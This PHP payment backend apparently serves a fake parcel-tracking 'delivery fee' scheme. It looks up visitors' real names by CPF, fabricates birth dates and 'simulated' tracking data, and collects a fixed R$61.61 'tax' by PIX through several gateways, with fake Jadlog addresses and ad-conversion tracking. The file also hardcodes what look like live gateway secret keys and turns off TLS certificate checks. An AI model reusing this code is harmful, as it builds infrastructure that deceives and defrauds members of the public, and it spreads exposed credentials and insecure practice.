<?php
ini_set('display_errors', 0);
error_reporting(0);

// HEADERS
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");

// CHAVES DAS APIs
$expressPayApiKey = 'sk_bd7119f2ea4a75b225c088729442e1f073bbcce9'; // Express Pay API Key
$fusionPayApiKey = 'sk_5uenlqIc9yvA_PA-EYhvbTuisP2HB1iRD2RaoCAmNtdm4vRJ'; // FusionPay API Key

$expressPayAuthHeader = "Basic " . base64_encode($expressPayApiKey);
$fusionPayAuthHeader = "Basic " . base64_encode($fusionPayApiKey);

// ConfiguraÃ§Ã£o Wintech
$wintechPublicKey = "entrega9900_11n9xzwj2af5npck";
$wintechSecretKey = "7zwixsixqltb578zze39xb8oj6xyd3sjpa0up39gbyx0xpkbfsqejdythu4toian";
$wintechApiUrl    = "https://app.wintechpagamentos.com/api/v1/gateway/pix/receive";

$gestaoPayConfig = require __DIR__ . '/gestaopay_config.php';
$valorConfig = require __DIR__ . '/valor_config.php';
$valorPadraoCentavos = (int)($valorConfig['valor_centavos'] ?? 6161);
$__cpfBloq = __DIR__ . '/../../_shared/cpf_bloqueio.php';
if (!is_file($__cpfBloq)) $__cpfBloq = __DIR__ . '/../_shared/cpf_bloqueio.php';
require_once $__cpfBloq;
require_once __DIR__ . '/../consulta_receita_lib.php';
require_once __DIR__ . '/utmify_lib.php';
require_once __DIR__ . '/meta_capi_lib.php';

function salvarLogGestaoPay($msg) {
    $data = date("d/m/Y H:i:s");
    @file_put_contents(__DIR__ . "/log_gestaopay.txt", "[$data] $msg\n\n", FILE_APPEND);
}

function extrairErroGestaoPay($res, $fallback = 'Erro ao gerar PIX') {
    if (!is_array($res)) {
        return $fallback;
    }
    if (!empty($res['error_messages']) && is_array($res['error_messages'])) {
        foreach ($res['error_messages'] as $item) {
            if (is_array($item) && !empty($item['message'])) {
                return (string)$item['message'];
            }
        }
    }
    if (!empty($res['message'])) {
        return (string)$res['message'];
    }
    if (!empty($res['error']) && is_string($res['error'])) {
        return $res['error'];
    }
    return $fallback;
}

function postbackUrlGestaoPay() {
    // Em producao Vercel, usar URL canonica que sempre resolve (rewrites cobrem /pagamento/webhook)
    $envUrl = getenv('GESTAOPAY_POSTBACK_URL') ?: '';
    if ($envUrl !== '') return $envUrl;
    // Detecta host Vercel vs local e força canonical
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    // Se estiver em Vercel (api/pagamento.php), dirname = /api — corrigir para /pagamento
    $dir = rtrim(str_replace('\\', '/', dirname($_SERVER['PHP_SELF'] ?? '/pagamento')), '/');
    if ($dir === '/api') $dir = '/pagamento';
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'https://';
    // Fallback canonical para producao conhecida
    if (str_contains($host, 'rastreioo-phi') || str_contains($host, 'minhapendencia') || str_contains($host, 'vercel.app')) {
        // usar /pagamento/webhook_gestaopay.php (tem rewrite -> /api/webhook_gestaopay.php)
        return 'https://' . $host . '/pagamento/webhook_gestaopay.php';
    }
    return $scheme . $host . $dir . '/webhook_gestaopay.php';
}

function consultarStatusGestaoPay(string $orderId): array
{
    global $gestaoPayConfig;

    $publicKey = trim((string)($gestaoPayConfig['public_key'] ?? ''));
    $secretKey = trim((string)($gestaoPayConfig['secret_key'] ?? ''));
    if ($publicKey === '' || $secretKey === '' || $orderId === '') {
        return ['success' => false, 'paid' => false, 'error' => 'Credenciais ou orderId invalido'];
    }

    $auth = 'Basic ' . base64_encode($publicKey . ':' . $secretKey);
    $url = 'https://api.gestaopayments.com/v1/payment-transaction/' . rawurlencode($orderId);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_HTTPHEADER => [
            'Accept: application/json',
            'authorization: ' . $auth,
        ],
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    $response = curl_exec($curl);
    $httpCode = (int)curl_getinfo($curl, CURLINFO_HTTP_CODE);
    $curlError = curl_error($curl);
    curl_close($curl);

    if ($curlError !== '') {
        salvarLogGestaoPay('CHECK CURL ' . $orderId . ' ' . $curlError);
        return ['success' => false, 'paid' => false, 'error' => $curlError, 'httpCode' => $httpCode];
    }

    $res = json_decode((string)$response, true);
    $root = $res['data'] ?? ($res['request'] ?? ($res['Request'] ?? $res));
    $statusRaw = strtoupper((string)($root['Status'] ?? ($root['status'] ?? '')));
    $isPaid = in_array($statusRaw, ['PAID', 'APPROVED', 'COMPLETED'], true);

    salvarLogGestaoPay('CHECK ' . $orderId . ' http=' . $httpCode . ' status=' . $statusRaw);

    return [
        'success' => $httpCode >= 200 && $httpCode <= 299,
        'paid' => $isPaid,
        'httpCode' => $httpCode,
        'status' => $statusRaw,
        'response' => $res,
    ];
}

function salvarLogWintech($msg) {
    $data = date("d/m/Y H:i:s");
    @file_put_contents(__DIR__ . "/log_wintech.txt", "[$data] $msg\n\n", FILE_APPEND);
}

function normalizarTelefone(string $telefone): string
{
    $digits = preg_replace('/\D/', '', $telefone);
    if ($digits === '') {
        return '11999999999';
    }
    if (strlen($digits) === 13 && str_starts_with($digits, '55')) {
        $digits = substr($digits, 2);
    }
    if (strlen($digits) === 10) {
        $digits = substr($digits, 0, 2) . '9' . substr($digits, 2);
    }
    if (strlen($digits) < 10) {
        return '11999999999';
    }
    return $digits;
}

function salvarLogFuriapay($msg) {
    $data = date("d/m/Y H:i:s");
    @file_put_contents(__DIR__ . "/log_furiapay.txt", "[$data] $msg\n\n", FILE_APPEND);
}

function parseEmvTlv(string $payload): array
{
    $result = [];
    $i = 0;
    $len = strlen($payload);

    while ($i + 4 <= $len) {
        $tag = substr($payload, $i, 2);
        if (!ctype_digit($tag)) {
            break;
        }

        $length = (int)substr($payload, $i + 2, 2);
        $i += 4;

        if ($length < 0 || $i + $length > $len) {
            break;
        }

        $result[$tag] = substr($payload, $i, $length);
        $i += $length;
    }

    return $result;
}

function extrairNominalPix(string $pixCode): ?string
{
    $pixCode = trim($pixCode);
    if ($pixCode === '') {
        return null;
    }

    $tlv = parseEmvTlv($pixCode);
    if (empty($tlv['59'])) {
        return null;
    }

    $nome = trim($tlv['59']);

    return $nome !== '' ? $nome : null;
}

function gerarPixFusionPay($valor, $nome, $email, $telefone, $cpf, ?array $extraMeta = null) {
    global $gestaoPayConfig;

    $publicKey = (string)($gestaoPayConfig['public_key'] ?? '');
    $secretKey = (string)($gestaoPayConfig['secret_key'] ?? '');
    $apiUrl = (string)($gestaoPayConfig['api_url'] ?? 'https://api.gestaopayments.com/v1/payment-transaction/create');

    if ($publicKey === '' || $secretKey === '') {
        return ['success' => false, 'error' => 'Credenciais GestaoPay nao configuradas'];
    }

    $cpfLimpo = preg_replace('/\D/', '', (string)$cpf);
    $telefoneLimpo = normalizarTelefone((string)$telefone);
    $telefoneComDdi = '55' . $telefoneLimpo;

    $valorCentavos = (int)round(((float)$valor) * 100);
    $identifier = 'pedido_' . uniqid();

    $payload = [
        'amount' => $valorCentavos,
        'payment_method' => 'pix',
        'postback_url' => postbackUrlGestaoPay(),
        'Customer' => [
            'Name' => $nome ?: 'Cliente',
            'Email' => $email ?: 'email@naoinformado.com',
            'Phone' => '+' . $telefoneComDdi,
            'Document' => [
                'Type' => 'cpf',
                'Number' => $cpfLimpo,
            ],
        ],
        'items' => [[
            'title' => 'Produto',
            'unit_price' => $valorCentavos,
            'quantity' => 1,
            'tangible' => false,
        ]],
        'metadata' => array_filter([
            'provider_name' => 'nova2026',
            'external_id' => $identifier,
            'telefone_cliente' => $telefoneLimpo,
            'fbp' => $extraMeta['fbp'] ?? null,
            'fbc' => $extraMeta['fbc'] ?? null,
            'url' => $extraMeta['url'] ?? null,
            'utm_source' => $extraMeta['utm_source'] ?? null,
            'utm_campaign' => $extraMeta['utm_campaign'] ?? null,
            'utm_medium' => $extraMeta['utm_medium'] ?? null,
            'src' => $extraMeta['src'] ?? null,
            'sck' => $extraMeta['sck'] ?? null,
        ], fn($v) => $v !== null && $v !== ''),
        'pix' => [
            'expires_in_days' => 1,
        ],
    ];

    $auth = 'Basic ' . base64_encode(trim($publicKey) . ':' . $secretKey);
    salvarLogGestaoPay('REQ ' . $identifier . ' VALOR=' . $valorCentavos . ' TEL=' . $telefoneLimpo . ' CPF=' . $cpfLimpo);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $apiUrl,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'Accept: application/json',
            'authorization: ' . $auth,
        ],
        CURLOPT_TIMEOUT => 30,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    $response = curl_exec($curl);
    $httpCode = (int)curl_getinfo($curl, CURLINFO_HTTP_CODE);
    $curlError = curl_error($curl);
    curl_close($curl);

    if ($curlError !== '') {
        salvarLogGestaoPay('ERRO CURL: ' . $curlError);
        return ['success' => false, 'error' => 'Erro de conexao', 'details' => $curlError];
    }

    salvarLogGestaoPay('RESP (' . $httpCode . '): success=' . ($httpCode >= 200 && $httpCode <= 201 ? 'true' : 'false'));

    $res = json_decode((string)$response, true);
    if ($httpCode < 200 || $httpCode > 201) {
        return [
            'success' => false,
            'error' => extrairErroGestaoPay($res),
            'response' => $res,
        ];
    }

    if (isset($res['success']) && $res['success'] === false) {
        return [
            'success' => false,
            'error' => extrairErroGestaoPay($res),
            'response' => $res,
        ];
    }

    $root = $res['data'] ?? ($res['request'] ?? ($res['Request'] ?? $res));
    $pix = $root['pix'] ?? ($root['Pix'] ?? []);
    $pixCode = $pix['qr_code']
        ?? ($pix['code']
        ?? ($pix['Code']
        ?? ($pix['qrcode']
        ?? ($pix['QrCode']
        ?? ($root['pixCode'] ?? ($root['emv'] ?? null))))));

    if (!$pixCode) {
        return ['success' => false, 'error' => 'Erro ao gerar PIX', 'response' => $res];
    }

    $pixQrBase64 = $pix['base64'] ?? ($pix['Base64'] ?? ($pix['image'] ?? ($root['qrCodeBase64'] ?? null)));
    $pixQr = $pixQrBase64 ? 'data:image/png;base64,' . $pixQrBase64 : null;
    $orderId = $root['id'] ?? ($root['transactionId'] ?? ($root['transaction_id'] ?? $identifier));
    $qrFallback = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' . urlencode($pixCode);

    return [
        'success' => true,
        'pix_code' => $pixCode,
        'pix_qrcode_url' => $pixQr ?: $qrFallback,
        'pix_favorecido' => extrairNominalPix($pixCode),
        'transaction_id' => $orderId,
        'provider' => 'gestaopay',
        'data' => $res,
    ];
}

function getPixField($pix, $keys) {
    foreach ($keys as $key) {
        if (!empty($pix[$key])) return $pix[$key];
    }
    return null;
}

if ($_GET['act'] === 'new') {
    $data = json_decode(file_get_contents("php://input"), true);

    if (!$data) {
        echo json_encode(["error" => "Dados invÃ¡lidos ou nÃ£o recebidos."]);
        exit;
    }

    // Dados especÃ­ficos do Jadlog
    $nome = $data["name"] ?? "Cliente Jadlog";
    $cpf = $data["cpf"] ?? "";
    $email = $data["email"] ?? "cliente@jadlog.com.br";
    $telefone = $data["telefone"] ?? "11999999999";
    
    // Valor fixo do projeto R$ 61,61
    $valor = isset($data["valor"]) ? (int)$data["valor"] : $valorPadraoCentavos;
    
    // Log para debug do valor
    @file_put_contents('log.txt', "VALOR RECEBIDO: " . ($data["valor"] ?? 'NÃƒO ENVIADO') . "\nVALOR USADO: $valor\n\n", FILE_APPEND);

    $apiUrl = 'https://api.fusionpaybr.com.br/v1/transactions';

    $payload = json_encode([
        "amount" => $valor,
        "currency" => "BRL",
        "paymentMethod" => "pix",
        "customer" => [
            "name" => $nome,
            "email" => $email,
            "document" => [
                "number" => $cpf,
                "type" => "cpf"
            ],
            "phone" => $telefone,
            "address" => [
                "street" => "EndereÃ§o Jadlog",
                "streetNumber" => "123",
                "complement" => "Jadlog Entrega",
                "zipCode" => "00000-000",
                "neighborhood" => "Centro",
                "city" => "SÃ£o Paulo",
                "state" => "SP",
                "country" => "BR"
            ]
        ],
        "items" => [[
            "title" => "TAX7982745",
            "unitPrice" => $valor,
            "quantity" => 1,
            "tangible" => false,
            "externalRef" => "jadlog_entrega"
        ]],
        "pix" => [
            "expiresInDays" => 2
        ],
        "traceable" => true
    ]);

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $apiUrl,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'Authorization: ' . $fusionPayAuthHeader,
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        ],
    ]);

    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    $error = curl_error($curl);
    curl_close($curl);

    @file_put_contents('log.txt', "HTTP: $httpCode\nErro: $error\nResposta:\n$response\nPayload:\n$payload");

    if ($httpCode === 200) {
        $responseData = json_decode($response, true);
        
        // Log da resposta para debug
        @file_put_contents('log.txt', "RESPOSTA FUSIONPAY:\n" . json_encode($responseData, JSON_PRETTY_PRINT) . "\n\n", FILE_APPEND);
        
        // Estrutura da Fusion Pay (baseada no correios6)
        $pixCode = $responseData['pix']['qrcode'] ?? $responseData['data']['pix']['qrcode'] ?? null;
        $orderId = $responseData['id'] ?? $responseData['data']['id'] ?? null;

        if ($pixCode && $orderId) {
            echo json_encode([
                "pixQrCode" => $pixCode,
                "pixCode" => $pixCode,
                "orderId" => $orderId,
                "valor" => "R$ " . number_format($valor / 100, 2, ',', '.')
            ]);
        } else {
            echo json_encode([
                "error" => "CobranÃ§a nÃ£o registrada na Fusion Pay",
                "resposta" => $responseData
            ]);
        }
    } else {
        echo json_encode(["error" => "Erro ao criar pagamento Jadlog", "statusCode" => $httpCode, "response" => $response]);
    }
    exit;
}

if ($_GET["act"] === "check") {
    $input = json_decode(file_get_contents("php://input"), true);
    $orderId = $input["orderId"] ?? null;

    // Log para debug
    @file_put_contents('log.txt', "CHECK PAYMENT - OrderId: " . ($orderId ?? 'NULL') . "\nInput: " . json_encode($input) . "\n\n", FILE_APPEND);

    if (!$orderId) {
        http_response_code(400);
        echo json_encode(["error" => "ID do pedido nÃ£o informado"]);
        exit;
    }

    $url = "https://api.fusionpaybr.com.br/v1/transactions/" . urlencode($orderId);
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_HTTPHEADER => [
            'Authorization: ' . $fusionPayAuthHeader
        ],
    ]);

    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);

    if ($httpCode === 200) {
        $responseData = json_decode($response, true);
        $transactionData = $responseData['data'] ?? $responseData;

        $status = $transactionData["status"] ?? '';
        $paid = $transactionData["paid"] ?? false;

        $isPaid = strtoupper($status) === "PAID" || $paid === true;

        echo json_encode([
            "status" => $isPaid ? "PAID" : "PENDING",
            "paid" => $isPaid
        ]);
    } else {
        http_response_code($httpCode);
        echo json_encode([
            "error" => "Erro ao verificar status",
            "httpCode" => $httpCode,
            "response" => $response
        ]);
    }
    exit;
}

// AÃ‡ÃƒO: /api.php?act=rastrear - RASTREAR CPF
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_GET['act'] ?? '') === 'rastrear') {
    $codigo = $_POST['codigo'] ?? '';
    
    if (empty($codigo)) {
        echo json_encode(["error" => "CÃ³digo nÃ£o informado"]);
        exit;
    }
    
    // FunÃ§Ã£o para gerar data de nascimento baseada no CPF
    function gerarDataNascimentoPorCPF($cpf) {
        $anos = ['1985', '1987', '1990', '1992', '1995', '1998', '2000', '2002'];
        $meses = ['01', '03', '05', '07', '09', '11'];
        $dias = ['05', '12', '18', '25', '28'];
        
        $ultimosDigitos = substr($cpf, -3);
        $indiceAno = intval(substr($ultimosDigitos, 0, 1)) % count($anos);
        $indiceMes = intval(substr($ultimosDigitos, 1, 1)) % count($meses);
        $indiceDia = intval(substr($ultimosDigitos, 2, 1)) % count($dias);
        
        return $dias[$indiceDia] . '/' . $meses[$indiceMes] . '/' . $anos[$indiceAno];
    }
    
    $cpfLimpo = preg_replace('/\D/', '', $codigo);
    $receita = consultarCpfReceita26($cpfLimpo);
    $cpfInfo = [
        'nome' => $receita['nome'] ?? '',
        'nascimento' => $receita['data_nascimento'] ?? '',
    ];
    if ($cpfInfo['nome'] !== '') {
        @file_put_contents("log.txt", "CPF $cpfLimpo OK: {$cpfInfo['nome']}\n", FILE_APPEND);
    }
    $dataNasc = $cpfInfo['nascimento'] !== '' ? $cpfInfo['nascimento'] : gerarDataNascimentoPorCPF($codigo);

    // Simular dados do rastreamento com dados dinÃ¢micos
    $dados = [
        "cpf" => $codigo,
        "nome" => $cpfInfo['nome'],
        "sexo" => (intval(substr($codigo, -1)) % 2 == 0) ? "F" : "M",
        "dataNascimento" => $dataNasc,
        "valor" => (string)$valorPadraoCentavos,
        "pixCode" => "",
        "pixQrCode" => "",
        "orderId" => "",
        "imagemComDados" => "assets/images/caixa.png"
    ];
    
    echo json_encode($dados);
    exit;
}

// AÃ‡ÃƒO: /api.php?act=fusion_new - FUSIONPAY
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_GET['act'] ?? '') === 'fusion_new') {
    $input = file_get_contents("php://input");
    $data = json_decode($input, true);
    @file_put_contents("log.txt", "REQUISIÃ‡ÃƒO FUSIONPAY:\n$input\n\n", FILE_APPEND);

    if (!$data || !isset($data["valor"])) {
        echo json_encode(["error" => "Dados invÃ¡lidos ou ausentes."]);
        exit;
    }

    // LIMPA CAMPOS
    $cpf      = preg_replace('/\D/', '', $data["cpf"] ?? "");
    $telefone = preg_replace('/\D/', '', $data["telefone"] ?? "");
    $cep      = preg_replace('/\D/', '', $data["cep"] ?? "");
    $valor    = (int) $data["valor"];

    $bloqueio = cpf_bloqueio_verificar($data, 'ativo');
    if ($bloqueio !== null) {
        echo json_encode($bloqueio);
        exit;
    }

    // PAYLOAD COMPLETO COM FALLBACK
    $payload = json_encode([
        "amount" => $valor,
        "currency" => "BRL",
        "paymentMethod" => "pix",
        "customer" => [
            "name" => $data["name"] ?? "Consumidor SPC",
            "email" => $data["email"] ?? "sememail@teste.com",
            "document" => [
                "number" => $cpf ?: "00000000191",
                "type" => "cpf"
            ],
            "phone" => $telefone ?: "11999999999",
            "address" => [
                "street" => $data["rua"] ?? "Rua Desconhecida",
                "streetNumber" => $data["numero"] ?? "100",
                "complement" => $data["complemento"] ?? "",
                "zipCode" => $cep ?: "01001000",
                "neighborhood" => $data["bairro"] ?? "Centro",
                "city" => $data["cidade"] ?? "SÃ£o Paulo",
                "state" => $data["estado"] ?? "SP",
                "country" => "BR"
            ]
        ],
        "items" => [[
            "title" => "P536587",
            "unitPrice" => $valor,
            "quantity" => 1,
            "tangible" => false,
            "externalRef" => "deposit"
        ]],
        "pix" => [
            "expiresInDays" => 5
        ],
        "traceable" => true
    ]);

    // ENVIA CURL PRA FUSIONPAY
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => 'https://api.fusionpaybr.com.br/v1/transactions',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => $payload,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'Authorization: ' . $fusionPayAuthHeader
        ],
    ]);

    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);

    // LOGA RESPOSTA
    @file_put_contents("fusion_debug.txt", "PAYLOAD:\n$payload\n\nHTTP $httpCode:\n$response\n\n", FILE_APPEND);

    if (!$response) {
        echo json_encode(["error" => "Erro de conexÃ£o com a FusionPay"]);
        exit;
    }

    $responseData = json_decode($response, true);
    $pixCode = $responseData['pix']['qrcode'] ?? $responseData['data']['pix']['qrcode'] ?? null;
    $orderId = $responseData['id'] ?? $responseData['data']['id'] ?? null;

    if ($httpCode === 200 && $pixCode && $orderId) {
        echo json_encode([
            "pixQrCode" => $pixCode,
            "pixCode" => $pixCode,
            "orderId" => $orderId
        ]);
    } else {
        echo json_encode([
            "error" => "CobranÃ§a nÃ£o registrada na GATE.",
            "resposta" => $responseData
        ]);
    }

    exit;
}

// AÃ‡ÃƒO: /api.php?act=fusion_check - VERIFICAR PAGAMENTO FUSIONPAY
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_GET['act'] ?? '') === 'fusion_check') {
    $input = json_decode(file_get_contents("php://input"), true);
    $orderId = $input["orderId"] ?? null;

    if (!$orderId) {
        http_response_code(400);
        echo json_encode(["error" => "ID do pedido nÃ£o informado"]);
        exit;
    }

    $url = "https://api.fusionpaybr.com.br/v1/transactions/" . urlencode($orderId);
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_HTTPHEADER => [
            'Authorization: ' . $fusionPayAuthHeader
        ],
    ]);

    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);

    if ($httpCode === 200) {
        $responseData = json_decode($response, true);
        $transactionData = $responseData['data'] ?? $responseData;

        $status = $transactionData["status"] ?? '';
        $paid = $transactionData["paid"] ?? false;

        $isPaid = strtoupper($status) === "PAID" || $paid === true;

        echo json_encode([
            "status" => $isPaid ? "PAID" : "PENDING",
            "paid" => $isPaid
        ]);
    } else {
        http_response_code($httpCode);
        echo json_encode([
            "error" => "Erro ao verificar status",
            "httpCode" => $httpCode,
            "response" => $response
        ]);
    }
    exit;
}

// AÃ‡ÃƒO: /api.php?act=gestaopay_check - VERIFICAR PAGAMENTO GESTAOPAY
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_GET['act'] ?? '') === 'gestaopay_check') {
    $input = json_decode(file_get_contents('php://input'), true);
    $orderId = (string)($input['orderId'] ?? '');

    if ($orderId === '') {
        http_response_code(400);
        echo json_encode(['error' => 'ID do pedido nÃ£o informado']);
        exit;
    }

    $pedido = utmifyCarregarPedido($orderId);
    $localStatus = strtolower((string)($pedido['status'] ?? ''));
    $isPaid = in_array($localStatus, ['paid', 'approved', 'completed'], true);

    if (!$isPaid) {
        $apiCheck = consultarStatusGestaoPay($orderId);
        if ($apiCheck['paid'] ?? false) {
            $approvedDate = gmdate('Y-m-d H:i:s');
            $apiRoot = $apiCheck['response']['data'] ?? ($apiCheck['response']['request'] ?? ($apiCheck['response'] ?? []));
            $paidAt = (string)($apiRoot['PaidAt'] ?? ($apiRoot['paidAt'] ?? ''));
            if ($paidAt !== '' && $paidAt !== '0001-01-01T00:00:00') {
                $timestamp = strtotime($paidAt);
                if ($timestamp !== false) {
                    $approvedDate = gmdate('Y-m-d H:i:s', $timestamp);
                }
            }

            $orderParaCapi = is_array($pedido) ? $pedido : [
                'orderId' => $orderId,
                'platform' => (string)(utmifyConfig()['platform'] ?? 'Rastreioo'),
                'createdAt' => gmdate('Y-m-d H:i:s'),
                'valorCentavos' => $valorPadraoCentavos,
                'customer' => [
                    'name' => 'Cliente',
                    'email' => 'cliente@email.com',
                    'phone' => null,
                    'document' => null,
                ],
                'trackingParameters' => utmifyNormalizarTracking(null),
            ];
            if (is_array($pedido)) {
                marcarPedidoPagoUtmify($orderId, $pedido, $approvedDate);
                // recarregar pedido atualizado para CAPI (com customer completo)
                $orderParaCapi = utmifyCarregarPedido($orderId) ?? $orderParaCapi;
            } else {
                utmifyRegistrarPedido($orderParaCapi, 'paid', $approvedDate);
                $orderParaCapi = utmifyCarregarPedido($orderId) ?? $orderParaCapi;
            }
            // CAPI Purchase server-side (deduplicado via event_id = orderId)
            if (!metaCapiJaEnviado($orderParaCapi)) {
                $capiRes = metaCapiEnviarPurchase($orderParaCapi, $orderId, $approvedDate);
                if (!empty($capiRes['success'])) {
                    metaCapiMarcarEnviado($orderId);
                }
            }
            $isPaid = true;
        }
    }

    echo json_encode([
        'status' => $isPaid ? 'PAID' : 'PENDING',
        'paid' => $isPaid,
        'orderId' => $orderId,
    ]);
    exit;
}

// AÃ‡ÃƒO: /api.php?act=wintech_new - CRIAR PIX (compatibilidade do front)
if (isset($_GET["act"]) && $_GET["act"] === "wintech_new") {
    $input = file_get_contents("php://input");
    $data  = json_decode($input, true);

    if (!$data || !isset($data["valor"])) {
        echo json_encode([
            "error" => "Dados invÃ¡lidos"
        ]);
        exit;
    }

    $nomeReal = $data["name"] ?? "Cliente";
    $emailReal = strtolower(trim((string) ($data["email"] ?? "anonimo@email.com")));

    $bloqueio = cpf_bloqueio_verificar($data, 'nova2026');
    if ($bloqueio !== null) {
        echo json_encode($bloqueio);
        exit;
    }

    $cpf = preg_replace('/\D/', '', $data["cpf"] ?? '');
    $telefoneReal = normalizarTelefone((string)($data['telefone'] ?? ($data['phone'] ?? '')));

    if (empty($cpf)) {
        echo json_encode(["error" => "CPF invÃ¡lido"]);
        exit;
    }

    // Valor fixo do projeto
    $valorCentavos = $valorPadraoCentavos;
    $valor         = $valorCentavos / 100;

    // Preparar meta fb antes, para injetar no metadata do GestãoPay (webhook recuperar em container efêmero)
    $fbpPre = $data['fbp'] ?? ($_COOKIE['_fbp'] ?? null);
    $fbcPre = $data['fbc'] ?? ($_COOKIE['_fbc'] ?? null);
    if (($fbcPre === null || $fbcPre === '') && !empty($data['trackingParameters']['fbclid'])) {
        $fbclidTmp = trim((string)$data['trackingParameters']['fbclid']);
        if ($fbclidTmp !== '') $fbcPre = 'fb.1.' . time() . '.' . $fbclidTmp;
    }
    if (($fbcPre === null || $fbcPre === '') && !empty($data['url'])) {
        $parsedTmp = parse_url((string)$data['url']);
        if (!empty($parsedTmp['query'])) { parse_str($parsedTmp['query'], $qTmp2); if (!empty($qTmp2['fbclid'])) $fbcPre = 'fb.1.' . time() . '.' . trim((string)$qTmp2['fbclid']); }
    }
    $extraMeta = [
        'fbp' => $fbpPre ?: null,
        'fbc' => $fbcPre ?: null,
        'url' => !empty($data['url']) ? (string)$data['url'] : null,
        'utm_source' => $data['trackingParameters']['utm_source'] ?? null,
        'utm_campaign' => $data['trackingParameters']['utm_campaign'] ?? null,
        'utm_medium' => $data['trackingParameters']['utm_medium'] ?? null,
        'src' => $data['trackingParameters']['src'] ?? null,
        'sck' => $data['trackingParameters']['sck'] ?? null,
    ];

    $resultado = gerarPixFusionPay($valor, $nomeReal, $emailReal, $telefoneReal, $cpf, $extraMeta);

    if (!($resultado["success"] ?? false)) {
        echo json_encode([
            "error" => $resultado["error"] ?? "Erro no pagamento",
            "detalhes" => $resultado
        ]);
        exit;
    }

    $orderId = (string)($resultado["transaction_id"] ?? uniqid('pedido_', true));
    $createdAt = gmdate('Y-m-d H:i:s');
    $trackingParameters = utmifyNormalizarTracking($data['trackingParameters'] ?? null);

    // CAPI: capturar fbp/fbc/UA/IP/URL no ato da criacao para enviar no Purchase server-side
    // Prioridade: payload do front > cookie > fbclid do tracking
    $fbcCookie = $data['fbc'] ?? ($_COOKIE['_fbc'] ?? null);
    $fbpCookie = $data['fbp'] ?? ($_COOKIE['_fbp'] ?? null);
    if (($fbcCookie === null || $fbcCookie === '') && !empty($data['trackingParameters']['fbclid'])) {
        $fbclidTmp = trim((string)$data['trackingParameters']['fbclid']);
        if ($fbclidTmp !== '') {
            $fbcCookie = 'fb.1.' . time() . '.' . $fbclidTmp;
        }
    }
    // fallback fbc via fbclid na URL do referer/url enviada pelo front
    if (($fbcCookie === null || $fbcCookie === '') && !empty($data['url'])) {
        $parsed = parse_url((string)$data['url']);
        if (!empty($parsed['query'])) {
            parse_str($parsed['query'], $qTmp);
            if (!empty($qTmp['fbclid'])) {
                $fbcCookie = 'fb.1.' . time() . '.' . trim((string)$qTmp['fbclid']);
            }
        }
    }
    $orderData = [
        'orderId' => $orderId,
        'platform' => (string)(utmifyConfig()['platform'] ?? 'Rastreioo'),
        'status' => 'waiting_payment',
        'createdAt' => $createdAt,
        'valorCentavos' => $valorCentavos,
        'customer' => [
            'name' => $nomeReal,
            'email' => $emailReal,
            'phone' => $telefoneReal,
            'document' => $cpf,
        ],
        'customer_address' => [
            'city' => $data['cidade'] ?? null,
            'state' => $data['estado'] ?? null,
            'zipCode' => $data['cep'] ?? null,
            'country' => 'BR',
        ],
        'trackingParameters' => $trackingParameters,
        'meta' => [
            'fbp' => $fbpCookie ?: null,
            'fbc' => $fbcCookie ?: null,
            'client_ip_address' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? ($_SERVER['REMOTE_ADDR'] ?? null)),
            'client_user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
            'event_source_url' => !empty($data['url']) ? (string)$data['url'] : ((isset($_SERVER['HTTP_REFERER']) && $_SERVER['HTTP_REFERER'] !== '' ? (string)$_SERVER['HTTP_REFERER'] : null) ?: (string)($_SERVER['HTTP_HOST'] ?? '')),
        ],
    ];

    utmifyRegistrarPedido($orderData, 'waiting_payment', null);

    echo json_encode([
        "pixQrCode" => $resultado["pix_qrcode_url"] ?? "",
        "pixCode" => $resultado["pix_code"] ?? "",
        "pixFavorecido" => $resultado["pix_favorecido"] ?? "",
        "orderId" => $orderId,
        "provider" => $resultado["provider"] ?? "gestaopay"
    ]);

